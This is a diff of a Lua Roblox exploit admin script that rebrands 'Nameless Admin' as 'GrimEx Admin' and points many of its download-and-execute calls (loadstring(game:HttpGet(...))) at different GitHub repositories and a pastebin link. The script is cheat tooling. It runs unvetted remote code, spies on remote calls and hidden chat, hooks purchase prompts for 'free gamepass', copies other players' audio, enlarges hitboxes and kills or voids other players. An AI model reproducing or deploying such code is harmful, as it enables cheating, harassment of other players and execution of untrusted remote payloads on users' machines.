- TextLabel_2.Text = "You are executing an anti-chat-log script meaning that Nameless Admin wouldnt be able to detect when you have chatted meaning if you are on mobile and use the chat to execute commands it wont work. Are you sure you want to execute this?"
+ TextLabel_2.Text = "You are executing an anti-chat-log script meaning that GrimEx Admin wouldnt be able to detect when you have chatted meaning if you are on mobile and use the chat to execute commands it wont work. Are you sure you want to execute this?"
  TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
  TextLabel_2.TextScaled = true
  TextLabel_2.TextSize = 14.000
@@ -8272,7 +8271,7 @@ print(text)
  UICorner_5.Parent = TextButton_2
  
  local function CPNQ_fake_script()
-	 local script = Instance.new('LocalScript', TextButton)
+ local script = Instance.new('LocalScript', TextButton)
  
 	 script.Parent.MouseButton1Click:Connect(function()
 	 
@@ -8625,7 +8624,7 @@ print(Time)
 		 wait(0.3)
 		 script.Parent.Parent:TweenPosition(UDim2.new(0.355, 0,1.291, 0), "Out", "Quint",1,true)
 		 wait(0.9)
-		 local AkaliNotif = loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/notifications"))();
+		 local AkaliNotif = loadstring(game:HttpGet("https://raw.githubusercontent.com/JoeScriptHub/FE/main/notificationtest"))();
 		 local Notify = AkaliNotif.Notify;
 		 Notify({
 			 Description = "Anti chat log has been ran.";
@@ -8645,7 +8644,7 @@ print(Time)
 		 end)
  end
  coroutine.wrap(OZEERJ_fake_script)()
- local function ELJBIKO_fake_script()
+  local function ELJBIKO_fake_script()
 	 local script = Instance.new('LocalScript', Frame)
  
 	 script.Parent.Position = UDim2.new(0.355, 0,-1.291, 0)
@@ -8749,7 +8748,7 @@ print(Time)
 	 
 	 Notify({
 	 Description = "Equip one of your tools.";
-	 Title = "Nameless Admin";
+	 Title = "GrimEx Admin";
 	 Duration = 5;
 	 
  });
@@ -9335,7 +9334,7 @@ getChar().HumanoidRootPart.CFrame = target.Character.Humanoid.RootPart.CFrame
  end)
  
  cmd.add({"pp", "penis"}, {"penis (pp)", "benis :flushed:"}, function()
- loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/p3n1s"))()
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/JoeScriptHub/GrimEx-Admin/main/pp"))()
  end)
  
  cmd.add({"stealaudio", "getaudio", "steal", "logaudio"}, {"stealaudio <player> (getaudio, logaudio, steal)", "Save all sounds a player is playing to a file  -Cyrus"}, function(p)
@@ -9346,7 +9345,7 @@ getChar().HumanoidRootPart.CFrame = target.Character.Humanoid.RootPart.CFrame
 	 
 	 Notify({
 	 Description = "Audio link has been copied to your clipboard";
-	 Title = "Nameless Admin";
+	 Title = "GrimEx Admin";
 	 Duration = 5;
 	 
  });
@@ -9485,11 +9484,11 @@ getChar().HumanoidRootPart.CFrame = target.Character.Humanoid.RootPart.CFrame
 	 
 	 Notify({
 	 Description = "Chat translated";
-	 Title = "Nameless Admin";
+	 Title = "GrimEx Admin";
 	 Duration = 5;
 	 
  });
-	 loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/ltseverydayyou/uuuuuuu/main/translatoooor"))()
+	 loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/x114/RobloxScripts/main/UpdatedChatTranslator"))()
  end)
  
  cmd.add({"freeze", "thaw", "anchor"}, {"freeze (thaw, anchor)", "Freezes your character"}, function()
@@ -9785,7 +9784,7 @@ getChar().HumanoidRootPart.CFrame = target.Character.Humanoid.RootPart.CFrame
 	 
 	 Notify({
 	 Description = "Hat resize loaded, rthro needed.";
-	 Title = "Nameless Admin";
+	 Title = "GrimEx Admin";
 	 Duration = 5;
 	 
  });
@@ -9793,21 +9792,10 @@ getChar().HumanoidRootPart.CFrame = target.Character.Humanoid.RootPart.CFrame
  loadstring(game:HttpGet('https://github.com/DigitalityScripts/roblox-scripts/raw/main/hat%20resize'))()
  end)
  
- cmd.add({"discord"}, {"discord", "discord server link"}, function()
-	 wait();
-	 
-	 Notify({
-	 Description = "there isn't any discord invite link from FilteringEnabled";
-	 Title = "Nameless Admin";
-	 Duration = 5;
-	 
-	 });
-	 end)
- 
  cmd.add({"exit"}, {"exit", "Close down roblox"}, function()
  game:Shutdown()
  end)
-
+ 
  cmd.add({"firekey", "fkey"}, {"firekey <key> (fkey)", "makes you fire a keybind using VirtualInputManager"}, function(...)
  local keycodex = (...)
  vim:SendKeyEvent(true, keycodex, 0, game)
@@ -9823,12 +9811,12 @@ getChar().HumanoidRootPart.CFrame = target.Character.Humanoid.RootPart.CFrame
 	 
 	 Notify({
 	 Description = "Leg resize loaded, R15 only";
-	 Title = "Nameless Admin";
+	 Title = "GrimEx Admin";
 	 Duration = 5;
 	 
  });
  game.Players.LocalPlayer.Character.Animate.Disabled = true
-	 loadstring(game:HttpGet('https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/leg%20resize'))()
+	 loadstring(game:HttpGet('https://raw.githubusercontent.com/DigitalityScripts/roblox-scripts/main/Leg%20Resize'))()
  end)
  
  cmd.add({"fat", "nikocadoavocado"}, {"fat (nikocadoavocado)", "fat"}, function()
@@ -9864,11 +9852,11 @@ getChar().HumanoidRootPart.CFrame = target.Character.Humanoid.RootPart.CFrame
  
  Notify({
  Description = "Making you small.. r15 needed";
- Title = "Nameless Admin";
+ Title = "GrimEx Admin";
  Duration = 5;
  
  });
-	 --script made by failedmite57926
+	 --Shit ass script made by failedmite57926
  
  local LocalPlayer = game:GetService("Players").LocalPlayer
  local Character = LocalPlayer.Character
@@ -10166,14 +10154,14 @@ end
  
 	return old(self, ...)
  end
-		
+ 
  
  
  wait();
  
  Notify({
  Description = "Free gamepass has been executed, keep in mind this wont always work.";
- Title = "Nameless Admin";
+ Title = "GrimEx Admin";
  Duration = 5;
  
  });
@@ -10411,7 +10399,7 @@ end
 			 
 			 Notify({
 			 Description = "Banging player...";
-			 Title = "Nameless Admin";
+			 Title = "GrimEx Admin";
 			 Duration = 5;
 			 
 			 });
@@ -10491,7 +10479,7 @@ until glueloop == false
  
  Notify({
  Description = "Airwalk: OFF";
- Title = "Nameless Admin";
+ Title = "GrimEx Admin";
  Duration = 5;
  
  });
@@ -10505,7 +10493,7 @@ until glueloop == false
  
  Notify({
  Description = "Airwalk: On";
- Title = "Nameless Admin";
+ Title = "GrimEx Admin";
  Duration = 5;
  
  });
@@ -10576,7 +10564,7 @@ until glueloop == false
 	 
 	 Notify({
 	 Description = "Boombox muted. Status: Client Sided";
-	 Title = "Nameless Admin";
+	 Title = "GrimEx Admin";
 	 Duration = 5;
 	 
 	 });
@@ -10585,7 +10573,7 @@ until glueloop == false
 	 
 	 Notify({
 	 Description = "Boombox muted. Status: FE";
-	 Title = "Nameless Admin";
+	 Title = "GrimEx Admin";
 	 Duration = 5;
 	 
 	 });
@@ -10755,7 +10743,7 @@ until glueloop == false
 				 
 				 Notify({
 				 Description = "Boombox glitched. Status: Client Sided";
-				 Title = "Nameless Admin";
+				 Title = "GrimEx Admin";
 				 Duration = 5;
 				 
 				 });
@@ -10768,7 +10756,7 @@ until glueloop == false
 				 
 				 Notify({
 				 Description = "Boombox glitched. Status: FE";
-				 Title = "Nameless Admin";
+				 Title = "GrimEx Admin";
 				 Duration = 5;
 				 
 				 });
@@ -10788,7 +10776,7 @@ until glueloop == false
 	 
 	 Notify({
 	 Description = "Unloopmuted everyone";
-	 Title = "Nameless Admin";
+	 Title = "GrimEx Admin";
 	 Duration = 5;
 	 
 	 });
@@ -10842,7 +10830,7 @@ until glueloop == false
  
  Notify({
  Description = "Boombox glitched. Status: Client Sided";
- Title = "Nameless Admin";
+ Title = "GrimEx Admin";
  Duration = 5;
  
  });
@@ -10855,7 +10843,7 @@ until glueloop == false
  
  Notify({
  Description = "Boombox glitched. Status: FE";
- Title = "Nameless Admin";
+ Title = "GrimEx Admin";
  Duration = 5;
  
  });
@@ -10874,7 +10862,7 @@ until glueloop == false
 			 
 			 Notify({
 			 Description = "Boombox unglitched. Status: Client Sided";
-			 Title = "Nameless Admin";
+			 Title = "GrimEx Admin";
 			 Duration = 5;
 			 
 			 });
@@ -10887,7 +10875,7 @@ until glueloop == false
 			 
 			 Notify({
 			 Description = "Boombox unglitched. Status: FE";
-			 Title = "Nameless Admin";
+			 Title = "GrimEx Admin";
 			 Duration = 5;
 			 
 			 });
@@ -10913,10 +10901,10 @@ until glueloop == false
  
 			 repeat wait(1)
 			 if Target == "all" or Target == "others" then
-									 loadstring(game:HttpGet('https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/leg%20resize'))()
+									 loadstring(game:HttpGet('https://raw.githubusercontent.com/DigitalityScripts/roblox-scripts/main/Leg%20Resize'))()
  print("Patched")
 			 else
-					 loadstring(game:HttpGet('https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/leg%20resize'))()
+					 loadstring(game:HttpGet('https://raw.githubusercontent.com/DigitalityScripts/roblox-scripts/main/Leg%20Resize'))()
 			 game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
 						 local Character = Player.Character        
 						 local PlayerGui = Player:waitForChild("PlayerGui")
@@ -10999,12 +10987,12 @@ until glueloop == false
 		 
 			 Notify({
 			 Description = target.Name .. "'s mass is " .. mass;
-			 Title = "Nameless Admin";
+			 Title = "GrimEx Admin";
 			 Duration = 5;
 			 
 			 });
 		 end)
-
+       
 		 cmd.add({"equiptools"}, {"equiptools", "Equips every tool in your inventory at once"}, function()
  		for i,v in pairs(Player:FindFirstChildOfClass("Backpack"):GetChildren()) do
 		if v:IsA("Tool") or v:IsA("HopperBin") then
@@ -11169,10 +11157,10 @@ until glueloop == false
  
 			 repeat wait()
 			 if Target == "all" or Target == "others" then
-									 loadstring(game:HttpGet('https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/leg%20resize'))()
+									 loadstring(game:HttpGet('https://raw.githubusercontent.com/DigitalityScripts/roblox-scripts/main/Leg%20Resize'))()
 				 print("Patched")
 			 else
-					 loadstring(game:HttpGet('https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/leg%20resize'))()
+					 loadstring(game:HttpGet('https://raw.githubusercontent.com/DigitalityScripts/roblox-scripts/main/Leg%20Resize'))()
 			 local function Kill()
 						 if not getPlr(Target) then
 						 end
@@ -11274,7 +11262,7 @@ until glueloop == false
 			 Target = (...)
 			 repeat wait(1)
 			 Player.Character.HumanoidRootPart.CFrame = CFrame.new(0,-642,0)
-								 loadstring(game:HttpGet('https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/leg%20resize'))()
+								 loadstring(game:HttpGet('https://raw.githubusercontent.com/DigitalityScripts/roblox-scripts/main/Leg%20Resize'))()
  local Character = Player.Character
  local PlayerGui = Player:waitForChild("PlayerGui")
  local Backpack = Player:waitForChild("Backpack")
@@ -11343,7 +11331,7 @@ until glueloop == false
 		 cmd.add({"lvoid", "legvoid"}, {"lvoid <player> (legvoid)", "Leg resize void"}, function(...)
 				 Target = (...)
 				 Player.Character.HumanoidRootPart.CFrame = CFrame.new(0,-633,0)
-									 loadstring(game:HttpGet('https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/leg%20resize'))()
+									 loadstring(game:HttpGet('https://raw.githubusercontent.com/DigitalityScripts/roblox-scripts/main/Leg%20Resize'))()
 						 local Character = Player.Character
 						 local PlayerGui = Player:waitForChild("PlayerGui")
 						 local Backpack = Player:waitForChild("Backpack")
@@ -11413,10 +11401,10 @@ until glueloop == false
 			 Target = (...)
  
 			 if Target == "all" or Target == "others" then
-									 loadstring(game:HttpGet('https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/leg%20resize'))()
+									 loadstring(game:HttpGet('https://raw.githubusercontent.com/DigitalityScripts/roblox-scripts/main/Leg%20Resize'))()
  print("Patched")
 			 else
-					 loadstring(game:HttpGet('https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/leg%20resize'))()
+					 loadstring(game:HttpGet('https://raw.githubusercontent.com/DigitalityScripts/roblox-scripts/main/Leg%20Resize'))()
 			 game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
 						 local Character = Player.Character        
 						 local PlayerGui = Player:waitForChild("PlayerGui")
@@ -11475,10 +11463,10 @@ until glueloop == false
 			 Target = (...)
  
 			 if Target == "all" or Target == "others" then
-									 loadstring(game:HttpGet('https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/leg%20resize'))()
+									 loadstring(game:HttpGet('https://raw.githubusercontent.com/DigitalityScripts/roblox-scripts/main/Leg%20Resize'))()
 				 print("Patched")
 			 else
-					 loadstring(game:HttpGet('https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/leg%20resize'))()
+					 loadstring(game:HttpGet('https://raw.githubusercontent.com/DigitalityScripts/roblox-scripts/main/Leg%20Resize'))()
 			 local function Kill()
 						 if not getPlr(Target) then
 						 end
@@ -12057,7 +12045,7 @@ until glueloop == false
 					 
 					 Notify({
 					 Description = "Purchase prompts have been disabled";
-					 Title = "Nameless Admin";
+					 Title = "GrimEx Admin";
 					 Duration = 5;
 					 
 					 });
@@ -12072,7 +12060,7 @@ until glueloop == false
 					 
 					 Notify({
 					 Description = "Purchase prompts have been enabled";
-					 Title = "Nameless Admin";
+					 Title = "GrimEx Admin";
 					 Duration = 5;
 					 
 					 });
@@ -12080,7 +12068,7 @@ until glueloop == false
 				 end)
 				 
 								 cmd.add({"nameless"}, {"nameless", "Makes your hats visible but not your name or your body"}, function()
- loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/namelesss"))()
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/JoeScriptHub/FE/main/nameless"))()
  end)
  
  
@@ -12150,7 +12138,7 @@ until glueloop == false
  
  Notify({
  Description = "Hold parts loaded, ctrl + click on a part";
- Title = "Nameless Admin";
+ Title = "GrimEx Admin";
  Duration = 5;
  
  });
@@ -12280,7 +12268,7 @@ until glueloop == false
 	 
 	 Notify({
 	 Description = "Spinning...";
-	 Title = "Nameless Admin";
+	 Title = "GrimEx Admin";
 	 Duration = 5;
 	 
  });
@@ -12310,7 +12298,7 @@ until glueloop == false
  
  Notify({
  Description = "Spin disabled";
- Title = "Nameless Admin";
+ Title = "GrimEx Admin";
  Duration = 5;
  
  });
@@ -12327,15 +12315,15 @@ until glueloop == false
  end)
  
  cmd.add({"notepad"}, {"notepad", "notepad for making scripts / etc"}, function()
- loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/notepade"))()
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/JoeScriptHub/GrimEx-Admin/main/Notepad"))()
  end)
  
  cmd.add({"rc7"}, {"rc7", "RC7 Internal UI"}, function()
- loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/rc%20sexy%207"))()
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/JoeScriptHub/FE/main/rc7"))()
  end)
  
  cmd.add({"scriptviewer", "viewscripts"}, {"scriptviewer (viewscripts)", "Can view scripts made by 0866"}, function()
-	 loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/uuuuuuu/main/scriptviewer", true))()
+	 loadstring(game:HttpGet("https://pastebin.com/raw/dva01xpE", true))()
  end)
  
  cmd.add({"hidename", "hname"}, {"hidename", "Hides your name only works on billboard uis"}, function()
@@ -12352,13 +12340,13 @@ until glueloop == false
 	 
 	 Notify({
 	 Description = "Name has been hidden, this only works on billboard guis / custom name fonts";
-	 Title = "Nameless Admin";
+	 Title = "GrimEx Admin";
 	 Duration = 5;
 	 
  });
  end)
  
- cmd.add({"hydroxide", "hydro"}, {"hydroxide (hydro)", "executes hydroxide"}, function()
+ cmd.add({"hydroxide"}, {"hydroxide", "executes hydroxide"}, function()
 	 local owner = "Upbolt"
  local branch = "revision"
  
@@ -12369,7 +12357,7 @@ until glueloop == false
  webImport("init")
  webImport("ui/main")
  end)
-
+ 
 cmd.add({"mobilehydroxide", "mhydroxide"}, {"mobilehydroxide (mhydroxide)", "executes hydroxide for mobile"}, function()
 	 local owner = "Hosvile"
 local branch = "revision"
@@ -12382,8 +12370,8 @@ webImport("init")
 webImport("ui/main")
  end)
  
- cmd.add({"remotespy", "simplespy", "rspy"}, {"remotespy (simplespy, rspy)", "executes simplespy that supports both pc and mobile"}, function()
- loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/uuuuuuu/main/simplee%20spyyy%20mobilee"))()
+cmd.add({"remotespy", "simplespy", "rspy"}, {"remotespy (simplespy, rspy)", "executes simplespy that supports both pc and mobile"}, function()
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/JoeScriptHub/FE/main/rspy"))()
  end)
  
  cmd.add({"gravity", "grav"}, {"gravity <amount> (grav)", "sets game gravity to whatever u want"}, function(...)
@@ -12395,7 +12383,7 @@ webImport("ui/main")
 	 
 	 Notify({
 	 Description = "Made unanchored parts have no gravity";
-	 Title = "Nameless Admin";
+	 Title = "GrimEx Admin";
 	 Duration = 5;
 	 
  });
@@ -12430,7 +12418,7 @@ webImport("ui/main")
  	end)
  end)
  
- cmd.add({"fireclickdetectors", "fcd", "firecd"}, {"fireclickdetectors (fcd, firecd)", "Fires every click detector that's in workspace"}, function(...)
+cmd.add({"fireclickdetectors", "fcd", "firecd"}, {"fireclickdetectors (fcd, firecd)", "Fires every click detector that's in workspace"}, function(...)
  local ccamount = 0
  local pro = (...)
  if pro then
@@ -12443,7 +12431,7 @@ webImport("ui/main")
 	 else
 	  for _,v in pairs(workspace:GetDescendants()) do
 		 if v:IsA("ClickDetector") then
-			 ccamount = ccamount + 1
+ccamount = ccamount + 1
 			 fireclickdetector(v)
 		 end
 	 end
@@ -12453,7 +12441,7 @@ webImport("ui/main")
  
  Notify({
  Description = "Fired " .. ccamount .. " amount of click detectors";
- Title = "Nameless Admin";
+ Title = "GrimEx Admin";
  Duration = 7;
  
  });
@@ -12516,11 +12504,13 @@ local PromptButtonHoldBegan = nil
  local UserInputService = game:GetService("UserInputService")
  local TweenService = game:GetService("TweenService")
  
+ -- function to teleport the player to the camera's position using tweening
  local function teleportPlayer()
 	 local character = player.Character or player.CharacterAdded:wait(1)
 	 local camera = game.Workspace.CurrentCamera
 	 local cameraPosition = camera.CFrame.Position
 	 
+	 -- create a new tween that moves the player's primary part to the camera position
 	 local tween = TweenService:Create(character.PrimaryPart, TweenInfo.new(2), {
 		 CFrame = CFrame.new(cameraPosition)
 	 })
@@ -12535,7 +12525,7 @@ local PromptButtonHoldBegan = nil
 		 teleportPlayer()
    
  end)
-
+ 
  cmd.add({"delete", "remove"}, {"delete {partname} (remove)", "Removes any part with a certain name from the workspace"}, function(...)
 	local delcount = 0
 	local cmdtxtbar = game.CoreGui.RobloxGui.CmdBar.CenterBar.Input.Text
@@ -12550,10 +12540,10 @@ local PromptButtonHoldBegan = nil
 
 	wait();
 
-	
+
 	Notify({
  Description = "Deleted over "..delcount.." part(s) named: "..thecode.."";
- Title = "Nameless Admin";
+ Title = "GrimEx Admin";
  Duration = 4;
  });
  end)
@@ -12571,10 +12561,10 @@ local PromptButtonHoldBegan = nil
 
 	wait();
 
-	
+
 	Notify({
  Description = "Deleted over "..delclass.." part(s) with ClassName of: "..JJ.."";
- Title = "Nameless Admin";
+ Title = "GrimEx Admin";
  Duration = 4;
  });
  end)
@@ -12595,7 +12585,7 @@ local PromptButtonHoldBegan = nil
 
 	Notify({
  Description = "Deleted over "..chardelprt.." part(s) inside the character with name: "..thecode.."";
- Title = "Nameless Admin";
+ Title = "GrimEx Admin";
  Duration = 4;
  });
  end)
@@ -12615,7 +12605,7 @@ local PromptButtonHoldBegan = nil
 
 	Notify({
  Description = "Deleted over "..charclass.." part(s) inside the character with ClassName of: "..poopy.."";
- Title = "Nameless Admin";
+ Title = "GrimEx Admin";
  Duration = 4;
  });
  end)
@@ -12643,7 +12633,7 @@ local thecode = cmdtxtbar:sub(indexx + 1)
 
  cmd.add({"gotopartclass", "gpc", "gotopartc"}, {"gotopartclass {classname} (gpc, gotopartc)", "Moves your character to a part or multiple parts based on classname"}, function(...)
 	local args = {...}
-    
+
     local partName = args[1]
 
     for i,v in pairs(workspace:GetDescendants()) do
@@ -12686,7 +12676,7 @@ for i,v in pairs(workspace:GetDescendants()) do
 		end
 	end
 end)
-
+ 
  cmd.add({"swim"}, {"swim {speed}", "Swim in the air"}, function(...)
  speaker = game.Players.LocalPlayer
  game.Workspace.Gravity = 0
@@ -12796,7 +12786,7 @@ for i, part in ipairs(parts) do
 end
  end)
  
- cmd.add({"viewpart", "viewp", "vpart"}, {"viewpart {partname} (viewp, vpart)", "Views a part"}, function()
+  cmd.add({"viewpart", "viewp", "vpart"}, {"viewpart {partname} (viewp, vpart)", "Views a part"}, function()
 	local cmdtxtbar = game.CoreGui.RobloxGui.CmdBar.CenterBar.Input.Text
 	local _, indexx = cmdtxtbar:find("%s")
 	local thecode = cmdtxtbar:sub(indexx + 1)
@@ -12842,7 +12832,7 @@ loophitbox = false
  
  Notify({
  Description = "Hitbox changed";
- Title = "Nameless Admin";
+ Title = "GrimEx Admin";
  Duration = 5;
  
  });
@@ -12920,7 +12910,7 @@ end)
  
  Notify({
  Description = "Car breaker loaded, sit on a vehicle need to be the driver";
- Title = "Nameless Admin";
+ Title = "GrimEx Admin";
  Duration = 5;
  
  });
@@ -13014,7 +13004,7 @@ end)
  
  Notify({
  Description = "Fired " .. ftiamount .. " amount of touch interests";
- Title = "Nameless Admin";
+ Title = "GrimEx Admin";
  Duration = 7;
  
  });
@@ -13028,7 +13018,7 @@ end)
 	 
 	 Notify({
 	 Description = "Infinite jump enabled";
-	 Title = "Nameless Admin";
+	 Title = "GrimEx Admin";
 	 Duration = 5;
 	 
  });
@@ -13056,7 +13046,7 @@ end)
  
  Notify({
  Description = "Infinite jump disabled";
- Title = "Nameless Admin";
+ Title = "GrimEx Admin";
  Duration = 5;
  
  });
@@ -13084,7 +13074,7 @@ end)
 	 
 	 Notify({
 	 Description = "Xray enabled";
-	 Title = "Nameless Admin";
+	 Title = "GrimEx Admin";
 	 Duration = 5;
 	 
  });
@@ -13100,7 +13090,7 @@ end)
 	 
 	 Notify({
 	 Description = "Xray disabled";
-	 Title = "Nameless Admin";
+	 Title = "GrimEx Admin";
 	 Duration = 5;
 	 
  });
@@ -13116,11 +13106,11 @@ end)
 	 
 	 Notify({
 	 Description = "Pastebin scraper loaded";
-	 Title = "Nameless Admin";
+	 Title = "GrimEx Admin";
 	 Duration = 5;
 	 
  });
-	 loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/trash(paste)bin%20scrapper"))()
+	 loadstring(game:HttpGet("https://raw.githubusercontent.com/JoeScriptHub/FE/main/PastebinScraper"))()
 	 game:GetService("CoreGui").Scraper["Pastebin Scraper"].BackgroundTransparency = 0.5
 	 game:GetService("CoreGui").Scraper["Pastebin Scraper"].TextButton.Text = "             ⭐ Pastebin Post Scraper ⭐"
 	 game:GetService("CoreGui").Scraper["Pastebin Scraper"].Content.Search.PlaceholderText = "Search for a post here..."
@@ -13135,7 +13125,7 @@ end)
 	 
 	 Notify({
 	 Description = "Amog us...";
-	 Title = "Nameless Admin";
+	 Title = "GrimEx Admin";
 	 Duration = 5;
 	 
  });
@@ -13218,7 +13208,7 @@ end)
 	 
 	 Notify({
 	 Description = "Blackhole has been loaded, press e to change the position to where your mouse is";
-	 Title = "Nameless Admin";
+	 Title = "GrimEx Admin";
 	 Duration = 5;
 	 
  });
@@ -13248,7 +13238,66 @@ end)
 				 game:GetService("Lighting").Brightness = 1
 			 end
 		 end)
-	 
+
+local brightLoop = nil
+
+ cmd.add({"loopfullbright", "loopfb", "lfb"}, {"loopfullbright (loopfb, lfb)", "Makes the map brighter / more visible but looped"}, function()
+ if brightLoop then
+		brightLoop:Disconnect()
+	end
+	local function brightFunc()
+		Lighting.ClockTime = 14
+		Lighting.FogEnd = 100000
+		Lighting.GlobalShadows = false
+		Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
+	end
+Lighting.Brightness = 3
+
+	brightLoop = RunService.RenderStepped:Connect(brightFunc)
+ end)
+
+ cmd.add({"unloopfullbright", "unloopfb", "unlfb"}, {"unloopfullbright (unloopfb, unlfb)", "Unloops fullbright"}, function()
+ if brightLoop then
+		brightLoop:Disconnect()
+	end
+ end)
+
+
+ local nightLoop = nil
+
+ cmd.add({"loopnight", "loopn", "ln"}, {"loopnight (loopn, ln)", "Changes the time to night for the client but looped"}, function()
+ if nightLoop then
+		nightLoop:Disconnect()
+	end
+	local function nightFunc()
+		Lighting.ClockTime = 0
+		Lighting.FogEnd = 100000
+		Lighting.GlobalShadows = false
+		Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
+	end
+Lighting.Brightness = 0
+
+	nightLoop = RunService.RenderStepped:Connect(nightFunc)
+ end)
+
+ cmd.add({"unloopnight", "unloopn", "unln"}, {"unloopnight (unloopn, unln)", "Unloops night"}, function()
+ if nightLoop then
+		nightLoop:Disconnect()
+	end
+ end)
+
+ cmd.add({"brightness"}, {"brightness", "Changes the brightness lighting property"}, function(...)
+ Lighting.Brightness = (...)
+ end)
+
+ cmd.add({"globalshadows", "gshadows"}, {"globalshadows (gshadows)", "Enables global shadows"}, function()
+ Lighting.GlobalShadows = true
+ end)
+
+ cmd.add({"unglobalshadows", "nogshadows", "ungshadows", "noglobalshadows"}, {"unglobalshadows (nogshadows, ungshadows, noglobalshadows)", "Disables global shadows"}, function()
+ Lighting.GlobalShadows = false
+ end)
+       
 		 game:GetService("Lighting"):GetPropertyChangedSignal("ClockTime"):Connect(function()
 			 if game:GetService("Lighting").ClockTime ~= 12 and game:GetService("Lighting").ClockTime ~= _G.NormalLightingSettings.ClockTime then
 				 _G.NormalLightingSettings.ClockTime = game:GetService("Lighting").ClockTime
@@ -13332,71 +13381,12 @@ end)
 	 _G.FullBrightExecuted = true
 	 _G.FullBrightEnabled = not _G.FullBrightEnabled
  end)
-
-local brightLoop = nil
-
- cmd.add({"loopfullbright", "loopfb", "lfb"}, {"loopfullbright (loopfb, lfb)", "Makes the map brighter / more visible but looped"}, function()
- if brightLoop then
-		brightLoop:Disconnect()
-	end
-	local function brightFunc()
-		Lighting.ClockTime = 14
-		Lighting.FogEnd = 100000
-		Lighting.GlobalShadows = false
-		Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
-	end
-Lighting.Brightness = 3
-
-	brightLoop = RunService.RenderStepped:Connect(brightFunc)
- end)
-
- cmd.add({"unloopfullbright", "unloopfb", "unlfb"}, {"unloopfullbright (unloopfb, unlfb)", "Unloops fullbright"}, function()
- if brightLoop then
-		brightLoop:Disconnect()
-	end
- end)
-
-
- local nightLoop = nil
-
- cmd.add({"loopnight", "loopn", "ln"}, {"loopnight (loopn, ln)", "Changes the time to night for the client but looped"}, function()
- if nightLoop then
-		nightLoop:Disconnect()
-	end
-	local function nightFunc()
-		Lighting.ClockTime = 0
-		Lighting.FogEnd = 100000
-		Lighting.GlobalShadows = false
-		Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
-	end
-Lighting.Brightness = 0
-
-	nightLoop = RunService.RenderStepped:Connect(nightFunc)
- end)
-
- cmd.add({"unloopnight", "unloopn", "unln"}, {"unloopnight (unloopn, unln)", "Unloops night"}, function()
- if nightLoop then
-		nightLoop:Disconnect()
-	end
- end)
-
- cmd.add({"brightness"}, {"brightness", "Changes the brightness lighting property"}, function(...)
- Lighting.Brightness = (...)
- end)
-
- cmd.add({"globalshadows", "gshadows"}, {"globalshadows (gshadows)", "Enables global shadows"}, function()
- Lighting.GlobalShadows = true
- end)
-
- cmd.add({"unglobalshadows", "nogshadows", "ungshadows", "noglobalshadows"}, {"unglobalshadows (nogshadows, ungshadows, noglobalshadows)", "Disables global shadows"}, function()
- Lighting.GlobalShadows = false
- end)
  
  cmd.add({"givehat", "givehatui"}, {"givehat (givehatui)", "Executes a hat giver gui check in console for hat names"}, function()
- loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/Gimme%20That%20Hat"))()
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/JoeScriptHub/GrimEx-Admin/main/GiveHat"))()
  end)
  
- cmd.add({"fireproximityprompts", "fpp", "firepp"}, {"fireproximityprompts (fpp, firepp)", "Fires every Proximity Prompt that's in workspace"}, function(...)
+cmd.add({"fireproximityprompts", "fpp", "firepp"}, {"fireproximityprompts (fpp, firepp)", "Fires every Proximity Prompt that's in workspace"}, function(...)
  fppamount = 0
  local fppname = (...)
  if fppname then
@@ -13411,20 +13401,20 @@ Lighting.Brightness = 0
 	for i,v in pairs(workspace:GetDescendants()) do
 		 if v:IsA("ProximityPrompt") then
 			 fppamount = fppamount + 1
-			 fireproximityprompt(v)
+          fireproximityprompt(v)
 		 end
  	end
  end
- 
-  
-	  
- 
+
+
+
+
  
  wait();
  
  Notify({
  Description = "Fired " .. fppamount .. " of proximity prompts";
- Title = "Nameless Admin";
+ Title = "GrimEx Admin";
  Duration = 7;
  
  });
@@ -13466,16 +13456,16 @@ Lighting.Brightness = 0
 	 wait();
 	 
 	 Notify({
-	 Description = "Chat spy enabled";
-	 Title = "Nameless Admin";
+	 Description = "Chat spy disabled";
+	 Title = "GrimEx Admin";
 	 Duration = 5;
 	 
  });
  --This script reveals ALL hidden messages in the default chat
  --chat "/spy" to toggle!
- enabled = true
+ enabled = false
  --if true will check your messages too
- spyOnMyself = false
+ spyOnMyself = true
  --if true will chat the logs publicly (fun, risky)
  public = false
  --if true will use /me to stand out
@@ -13881,12 +13871,12 @@ Lighting.Brightness = 0
  main()
  end)
  
